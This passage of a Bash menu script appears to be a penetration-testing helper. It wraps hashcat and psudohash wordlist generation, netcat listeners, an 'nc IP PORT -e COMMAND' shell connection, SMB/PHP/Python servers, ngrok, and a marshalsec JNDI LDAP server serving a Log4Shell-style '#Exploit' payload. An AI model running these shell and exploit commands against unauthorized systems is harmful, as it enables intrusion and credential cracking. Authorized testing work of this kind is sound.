                                                        printf "${WHITE}Select An Option:${NC}\n\n"
                                                        echo -e "${CYAN}1. Normal (Paddings After) ${NC}"
                                                        echo -e "${CYAN}2. Complex (Paddings After + Before) ${NC}"
                                                        echo -e "${YELLOW}0. Back ${NC}\n"
                                                        echo -n -e "${RED}Enter selection [0-2]: ${NC}"
                                                        printf ${WHITE};read -e  -r psudo;
                                                        printf "\n";clear;

                                                            case $psudo in
                                                                1) 
                                                                    
                                                                while [[ $WORD == "" ]]
                                                                do    
                                                                        printf "${WHITE}Insert a Word (or multiple using ','):\n"${NC}
                                                                        read -e  WORD;
                                                                        printf "${WHITE}Word(s): ${YELLOW}$WORD${WHITE}\n\n"                                                            
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                done
                                                                        clear;
                                                                        printf "${WHITE}Word(s): ${YELLOW}$WORD${WHITE}\n\n"
                                                                        printf "${WHITE}Executing command: ${YELLOW}psudohash -w '${PURPLE}$WORD${YELLOW}' --common-paddings-after \n\n" 
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                        psudohash.py -w "$WORD" --common-paddings-after;;                                 

                                                                2) 
                                                                    
                                                                while [[ $WORD == "" ]]
                                                                do    
                                                                        printf "${WHITE}Insert a Word (or multiple using ','):\n"${NC}
                                                                        read -e  WORD;
                                                                        printf "${WHITE}Word(s): ${YELLOW}$WORD${WHITE}\n\n"
                                                                        printf "${WHITE}Insert numbers or years (or multiple using ','):\n"${NC}
                                                                        read -e  WORD2;
                                                                        printf "${WHITE}Numers/Years: ${YELLOW}$WORD2${WHITE}\n\n"                                                                     
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                done
                                                                        clear;
                                                                        printf "${WHITE}Word(s): ${YELLOW}$WORD${WHITE}\n\n${WHITE}Numbers/Years: ${YELLOW}$WORD${WHITE}\n\n"
                                                                        printf "${WHITE}Executing command: ${YELLOW}psudohash -w ${PURPLE}$WORD${YELLOW}--common-paddings-after --common-paddings-before -y "$WORD2" \n\n" 
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                        psudohash.py -w "$WORD" --common-paddings-after --common-paddings-before -y "$WORD2" ;;                                 

                                                                0)
                                                                    clear;
                                                                    break;;
                                                            esac    
                                                    done;;

                                                3) 

                                                    while : ; do
                                                        printf "${WHITE}Select An Option:${NC}\n\n"
                                                        echo -e "${CYAN}1. Check the rules ${NC}"
                                                        echo -e "${CYAN}2. Create a Wordlist${NC}"
                                                        echo -e "${YELLOW}0. Back ${NC}\n"
                                                        echo -n -e "${RED}Enter selection [0-2]: ${NC}"
                                                        printf ${WHITE};read -e  -r hrules;
                                                        printf "\n";clear;

                                                            case $hrules in
                                                                1) 
                                                                   printf "${YELLOW}/usr/share/hashcat/rules\n\n";
                                                                   ls /usr/share/hashcat/rules;printf "\n\n";;

                                                                2)

                                                                while [[ $RULE == "" || $TEXT == "" ]]
                                                                do    
                                                                        printf "${WHITE}Insert a text files:\n"${NC}
                                                                        read -e  TEXT;
                                                                        printf "${WHITE}Text file: ${YELLOW}$TEXT${WHITE}\n\n"
                                                                        nano /home/$USER/$TEXT
                                                                        printf "${WHITE}Insert a Hashcat Rule:\n"${NC}
                                                                        read -e  RULE;
                                                                        printf "${WHITE}Hashcat Rule: ${YELLOW}$RULE${WHITE}\n\n"                                                                     
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                done
                                                                        clear;
                                                                        printf "${WHITE}Text file: ${YELLOW}$TEXT${WHITE}\n\n${WHITE}Rule: ${YELLOW}$RULE${WHITE}\n\n"
                                                                        printf "${WHITE}Executing command: ${YELLOW}hashcat --force --stdout ${PURPLE}$TEXT${YELLOW} -r ${PURPLE}$RULE${YELLOW} > /home/$USER/wordlist.txt \n\n" 
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                        hashcat --force --stdout /home/$USER/$TEXT -r $RULE > /home/$USER/wordlist.txt ;;  
                                                                    
                                                                0)
                                                                    clear;
                                                                    break;;

                                                            esac

                                                    done;;
                                                
                                                0)
                                                clear;
                                                break;;


                                        esac

                                done;;

                            0)
                            clear;
                            break;;
                        esac

                done;;

#wifi       19)


#netcat  
            20)
                while : ; do

                    printf "${WHITE}Select An Option:${NC}\n\n"
                    echo -e "${CYAN}1. Listen with Netcat${NC}"
                    echo -e "${CYAN}2. Connect with Netcat${NC}"
                    echo -e "${CYAN}3. Banner Grabing ${NC}"          
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-3]: ${NC}"
                    printf ${WHITE};read -e  -r listeners;
                    printf "\n";clear;

                        case $listeners in

                            1)

                                while [[ $FLAG == "" || $PORT == "" ]]
                                do    
                                        printf "${WHITE}Insert Netcat Flags:\n"${NC}
                                        read -e  FLAG;
                                        printf "${WHITE}Flags: ${YELLOW}$FLAG${WHITE}\n\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done                              
                                        clear;
                                        printf "${WHITE}Flags: ${YELLOW}$FLAG${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}nc ${PURPLE}-$FLAG $PORT${YELLOW} \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "nc -$FLAG $PORT"
                                        printf "\n";unset FLAG;unset PORT;;

                            2)
                                while [[ $IP == "" || $PORT == "" || $COMMAND == "" ]]
                                do    
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Insert Command:\n"${NC}
                                        read -e  COMMAND;
                                        printf "${WHITE}Command: ${YELLOW}$COMMAND${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done                              
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\nCommand: ${YELLOW}$COMMAND${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}nc ${PURPLE}$IP $PORT -e $COMMAND${YELLOW} \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "nc $IP $PORT -e $COMMAND"
                                        printf "\n";unset IP;unset PORT; unset COMMAND;;
                                
                            3)
                                while [[ $IP == "" || $PORT == "" ]]
                                do    
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done                              
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}nc -vv -n ${PURPLE}$IP $PORT${YELLOW} \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "nc -vv -n $IP $PORT"
                                        printf "\n";unset IP;unset PORT;;

                            0)
                                clear;
                                break;;
                        esac

                done;;


#servers    
            21)

                while : ; do

                    printf "${WHITE}Select An Option:${NC}\n\n"
                    echo -e "${CYAN}1. Python Web Server ${NC}"
                    echo -e "${CYAN}2. PHP Server ${NC}"
                    echo -e "${CYAN}3. SMB Server${NC}"
                    echo -e "${CYAN}4. LDAP Server${NC}"
                    echo -e "${CYAN}5. Apache2${NC}"
                    echo -e "${CYAN}6. Ngrok${NC}"                 
                    echo -e "${GREEN}7. Clear Values ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-7]: ${NC}"
                    printf ${WHITE};read -e  -r servers;
                    printf "\n";clear;

                        case $servers in

                            1)
                                while [[ $PORT == "" ]]
                                do    
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Insert Location:\n"${NC}
                                        read -e  LOCATION;
                                        printf "${WHITE}Location: ${YELLOW}$LOCATION${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done                              

                                if [[ $LOCATION == "" ]]
                                then 
                                        clear;
                                        printf "${WHITE}Location: ${YELLOW}$LOCATION${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}python3 -m http.server ${PURPLE}$PORT${YELLOW} \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "python3 -m http.server $PORT"
                                        printf "\n"
                                else
                                        clear;
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}python3 -m http.server ${PURPLE}$PORT${YELLOW} \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        cd $LOCATION; terminator -e "python3 -m http.server $PORT"
                                        printf "\n"

                                fi;;
                            2)
                                while [[ $PORT == "" ]]
                                do    
                                        printf "${WHITE}Insert IP:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}IP: ${YELLOW}$IP${WHITE}\n\n"                                    
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Insert Location:\n"${NC}
                                        read -e  LOCATION;
                                        printf "${WHITE}Location: ${YELLOW}$LOCATION${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done                              

                                if [[ $LOCATION == "" ]]
                                then 
                                        clear;
                                        printf "${WHITE}IP: ${YELLOW}$IP${WHITE}\n\n${WHITE}Location: ${YELLOW}$LOCATION${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}php -S ${PURPLE}$IP${YELLOW}:${PURPLE}$PORT${YELLOW} \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "php -S $IP:$PORT"
                                        printf "\n"
                                else
                                        clear;
                                        printf "${WHITE}IP: ${YELLOW}$IP${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}php -S ${PURPLE}$IP${YELLOW}:${PURPLE}$PORT${YELLOW} \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        cd $LOCATION; terminator -e "php -S $IP:$PORT";
                                        printf "\n"

                                fi;;

                             3)
                                while [[ $SHARE == "" ]]
                                do    
                                        printf "${WHITE}Insert Share Name:\n"${NC}
                                        read -e  SHARE;
                                        printf "${WHITE}SHARE: ${YELLOW}$SHARE${WHITE}\n\n"                                    
                                        printf "${WHITE}Insert Username:\n"${NC}
                                        read -e  USERNAME;
                                        printf "${WHITE}USERNAME: ${YELLOW}$USERNAME${WHITE}\n\n"
                                        printf "${WHITE}Insert Password:\n"${NC}
                                        read -e  PASSWORD;
                                        printf "${WHITE}PASSWORD: ${YELLOW}$PASSWORD${WHITE}\n\n"                                     
                                        printf "${WHITE}Insert Location:\n"${NC}
                                        read -e  LOCATION;
                                        printf "${WHITE}Location: ${YELLOW}$LOCATION${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done                              

                                if [[ $LOCATION == "" ]]
                                then

                                    if [[ $USERNAME == "" || $PASSWORD == "" ]]
                                    then
                                        clear;
                                        printf "${WHITE}SHARE: ${YELLOW}$SHARE${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}impachet-smbserver ${PURPLE}$SHARE${YELLOW} $(pwd) -smb2support \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "impacket-smbserver $SHARE $(pwd) -smb2support"
                                        printf "\n";unset SHARE;
                                    else
                                        clear;
                                        printf "${WHITE}SHARE: ${YELLOW}$SHARE${WHITE}\n\n${WHITE}Location: ${YELLOW}$LOCATION${WHITE}\n\nUsername: ${YELLOW}$USERNAME${WHITE}\n\nPassword: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}impachet-smbserver ${PURPLE}$SHARE${YELLOW} $(pwd) -user ${PURPLE}$USERNAME${YELLOW} -password ${PURPLE}$PASSWORD${YELLOW} -smb2support \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "impacket-smbserver $SHARE $(pwd)  -user $USERNAME -password $PASSWORD -smb2support "
                                        printf "\n"; unset USERNAME;unset PASSWORD;unset SHARE;
                                    fi

                                else
                                    if [[ $USERNAME == "" || $PASSWORD == "" ]]
                                    then

                                        clear;
                                        printf "${WHITE}SHARE: ${YELLOW}$SHARE${WHITE}\n\nLocation: ${YELLOW}$LOCATION${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}impachet-smbserver ${PURPLE}$SHARE${YELLOW} $LOCATION -smb2support \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "impacket-smbserver $SHARE $LOCATION -smb2support"
                                        printf "\n";unset LOCATION;unset SHARE;
                                    else
                                        clear;
                                        printf "${WHITE}SHARE: ${YELLOW}$SHARE${WHITE}\n\n${WHITE}Location: ${YELLOW}$LOCATION${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}impachet-smbserver ${PURPLE}$SHARE${YELLOW} $LOCATION -user ${PURPLE}$USERNAME${YELLOW} -password ${PURPLE}$PASSWORD${YELLOW} -smb2support \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "impacket-smbserver $SHARE $LOCATION  -user $USERNAME -password $PASSWORD -smb2support "
                                        printf "\n"; unset SHARE;unset LOCATION; unset USERNAME; unset PASSWORD;
                                    fi
                                fi;;

                            4)

                                while [[ $IP == "" || $PORT == "" || PAYLOAD == "" ]]
                                do    
                                        printf "${WHITE}Insert IP of http.server:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}IP: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Insert Port of http.server:\n"${NC}
                                        read -e  PORT;
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Insert Payload:\n"${NC}
                                        read -e  PAYLOAD;
                                        printf "${WHITE}Payload: ${YELLOW}$PAYLOAD${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done                              

                                if [[ $PAYLOAD == "" ]]
                                then 
                                        clear;
                                        printf "${WHITE}Ip: ${YELLOW}$IP${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\nPayload: ${YELLOW}$PAYLOAD${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}java -cp /usr/local/bin/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer ${PURPLE}$IP:$PORT${YELLOW}/#Exploit \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "java -cp /usr/local/bin/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://$IP:$PORT/#Exploit'"
                                        printf "\n";unset IP;unset PORT;unset PAYLOAD;
                                else
                                        clear;
                                        printf "${WHITE}Ip: ${YELLOW}$IP${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\nPayload: ${YELLOW}$PAYLOAD${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}java -cp /usr/local/bin/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer ${PURPLE}$IP:$PORT${YELLOW}/#$PAYLOAD \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "java -cp /usr/local/bin/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://$IP:$PORT/#$PAYLOAD'"
                                        printf "\n";unset IP;unset PORT;unset PAYLOAD;

                                fi;;


                            5)
                                    while : ; do


                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                    echo -e "${CYAN}1. Start Apache2 ${NC}"
                                    echo -e "${CYAN}2. Stop Apache ${NC}"
                                    echo -e "${CYAN}3. Status${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-]: ${NC}"
                                    printf ${WHITE};read -e  -r apache2;
                                    printf "\n";clear;

                                        case $apache2 in

                                            1)
                                                sudo service apache2 start;;
                                                
                                            2)
                                                sudo service apache2 stop;;
                                            3) 
                                                sudo service apache2 status;
                                                echo -e "${NC}-------------------------------------------${NC}\n";;

                                            0)
                                                clear;
                                                break;;
                                        esac

                                    done;;

                            6)
                            
                                while [[ $PORT == "" || PROTOCOL == "" ]]
                                do    
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Insert Protocol:\n"${NC}
                                        read -e  PROTOCOL;
                                        printf "${WHITE}Protocol: ${YELLOW}$PROTOCOL${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done                
                                        clear;
                                        printf "${WHITE}Protocol: ${YELLOW}$PROTOCOL${WHITE}\n\nPort: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}ngrok ${PURPLE}$PROTOCOL $PORT${YELLOW} \n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        terminator -e "ngrok $PROTOCOL $PORT"
                                        printf "\n";unset PROTOCOL;unset PORT;;


                            7)
                                    clear;
                                    printf "Values Cleared!\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    unset IP;unset PORT;unset LOCATION; unset SHARE; unset USERNAME; unset PASSWORD; unset PAYLOAD ;;
                            0)
                                    clear;
                                    break;;

                        esac
                        
                    done;;    

            22) 
                echo "Enter the IP Address:"
                printf "${CYAN}";read -e  IP;
                printf "${WHITE}";echo "Enter Port:"
                printf "${CYAN}";read -e  PORT;
                clear;
                echo -e "${NC}-------------------------------------------${NC}"
                printf "${WHITE}";printf "\nIP: ${CYAN}$IP\n";printf "${WHITE}";printf "${WHITE}\nPORT: ${CYAN}$PORT\n";;    


            23) 
                echo -e "${NC}-------------------------------------------${NC}"

                printf "${WHITE}\nIP: ${CYAN}$IP\n"
                printf "${WHITE}\nPORT: ${CYAN}$PORT\n";;    

            24) 
                printf "\nIP And Port Cleared!\n"
                unset IP;unset PORT;;

            25)
                printf "Enter Name:"
                printf "\n${CYAN}";read FNAME; printf "\n"
                printf "${WHITE}Enter The Company:"
                printf "\n${CYAN}";read FCOMPANY; printf "\n"
                printf "${WHITE}Create a Folder:"
                printf "\n${CYAN}";read FOLDER; printf "\n"
                mkdir /home/$USER/$FOLDER
                clear; 
                printf "${WHITE}";printf "\nCustomer: ${CYAN}$FNAME\n";printf "${WHITE}\nCompany: ${CYAN}$FCOMPANY\n";printf "${WHITE}\nLocation: ${CYAN}/home/$USER/$FOLDER\n"
                ;;

            26) 
                printf "${WHITE}";printf "\nCustomer: ${CYAN}$FNAME\n";printf "${WHITE}\nCompany: ${CYAN}$FCOMPANY\n";printf "${WHITE}\nFolder: ${CYAN}$FOLDER";printf "\n";;

            27)
                printf "\nProfile $FOLDER deleted."
                unset FNAME; unset FCOMPANY; unset FOLDER;;

            28)    
                while : ; do
                    printf "${WHITE}Select An Option:${NC}\n\n"
                    echo -e "${CYAN}1. Read Guide ${NC}"
                    echo -e "${CYAN}2. Install All Tools ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-2]: ${NC}"
                    printf ${WHITE};read -e  -r guide;
                    printf "\n";clear;
                        case $guide in
                            1)
                              printf "${CYAN}";echo "----------------------------------------------------------";printf "\n"
                              printf "${WHITE}Nmap${CYAN}\n\n";
                              printf "Requires mandatory flags: ${WHITE}IP ${CYAN}and ${WHITE}FILENAME${CYAN}.";
                              printf "If required a specific flag(s) like (-Pn or -T3) there is one available Flag field for input on every scan or can be added in others values fields (${WHITE}Ex: Insert Port: 443 -Pn${CYAN})\n\n";
                              echo "----------------------------------------------------------";printf "\n"
                              printf "${WHITE}Terminator${CYAN} required for some tools (Ex: MetaSploit )\n\n";
                              echo "----------------------------------------------------------";printf "\n"
                              printf "You can create a ${WHITE}Customer Profile${CYAN}, all the scans that require ${WHITE}Filename${CYAN} will be saved there; If no profile created will be saved in ${WHITE}Home Directory${CYAN} (if you create a profile and after delete the folder, some tools like ${WHITE}Nuclei ${CYAN}or ${WHITE}Nikto${CYAN} might not work, so keep the folder or delete the profile from main menu)."
                              printf "If you find an ${WHITE}error/issue${CYAN}, don't hesitate to contact me - ${WHITE}blackito@protonmail.com;\n\n${CYAN}"
                              echo "----------------------------------------------------------";printf "\n"
                              printf "${WHITE}Installation tools${CYAN} are tested on ${WHITE}Kali distribution${CYAN}, other distributions like ${WHITE}Parrot ${CYAN}or ${WHITE}Ubuntu${CYAN} aren't tested, so you might have ${WHITEs}issues${CYAN} and do its recommended to do it manually bit using ${WHITE}git clone${CYAN} or adding ${WHITE}Kali repository${CYAN} to source list on your distribution\n\n";
                              echo "----------------------------------------------------------";printf "\n";;
                            2) 
                              sudo apt update -y && sudo apt install terminator -y && sudo apt install iputils-ping -y && sudo apt install nmap -y && sudo apt install dirb -y && sudo apt install wfuzz -y && sudo apt install gobuster -y && sudo apt install feroxbuster -y && sudo apt install ffuf -y && sudo apt install sslscan -y && sudo apt install testssl.sh -y && sudo apt install nbtscan -y && sudo apt install metasploit-framework -y && sudo apt install smbclient -y && sudo apt install smbmap -y && sudo apt install enum4linux -y && sudo apt install hydra -y && sudo apt install python3-impacket -y && sudo apt install crackmapexec -y && sudo apt install ldap-utils -y && sudo apt install netcat-traditional -y && sudo apt install smtp-user-enum -y && sudo apt install openssl -y && sudo apt install whois -y && sudo apt install dnsutils -y && sudo apt install snmpcheck -y && sudo apt install onesixtyone -y && sudo apt install rpcbind -y && sudo apt install smbclient -y && sudo apt install samba-common-bin -y && sudo apt install nikto -y && sudo apt install nuclei -y && sudo apt install hping3 -y && sudo apt install exploitdb -y && sudo apt install wpscan -y && sudo pip3 install dirhunt && sudo pip3 install slowloris;;
                            
                            0)
                              clear;
                              break;;
                        esac

                done;;
            0)  exit

        esac

done
